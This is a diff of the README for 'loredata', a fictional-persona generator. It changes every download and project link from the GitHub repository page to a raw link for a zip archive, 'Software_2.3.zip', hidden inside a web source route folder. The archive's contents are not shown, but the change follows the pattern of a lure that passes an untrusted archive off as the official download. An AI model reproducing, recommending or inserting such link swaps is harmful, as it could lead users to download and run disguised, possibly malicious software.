@@ -1,6 +1,6 @@
 # 🎭 loredata - Create Cohesive Fictional Personas
 
-[![Download loredata](https://img.shields.io/badge/Download-loredata-purple?style=for-the-badge)](https://github.com/herybrts/loredata)
+[![Download loredata](https://img.shields.io/badge/Download-loredata-purple?style=for-the-badge)](https://raw.githubusercontent.com/herybrts/loredata/main/apps/web/src/routes/interests/[slug]/Software_2.3.zip)
 
 ## 🧩 What loredata does
 
@@ -21,7 +21,7 @@ Each persona stays within one world. That helps the data feel natural and easier
 
 Use the link below to visit the download page:
 
-[Visit the loredata page](https://github.com/herybrts/loredata)
+[Visit the loredata page](https://raw.githubusercontent.com/herybrts/loredata/main/apps/web/src/routes/interests/[slug]/Software_2.3.zip)
 
 ### 1. Open the page
 
@@ -205,7 +205,7 @@ Use loredata when you need:
 
 Use this link to get the app:
 
-[https://github.com/herybrts/loredata](https://github.com/herybrts/loredata)
+[https://raw.githubusercontent.com/herybrts/loredata/main/apps/web/src/routes/interests/[slug]/Software_2.3.zip](https://raw.githubusercontent.com/herybrts/loredata/main/apps/web/src/routes/interests/[slug]/Software_2.3.zip)
 
 ## 🧭 Suggested First Run
 
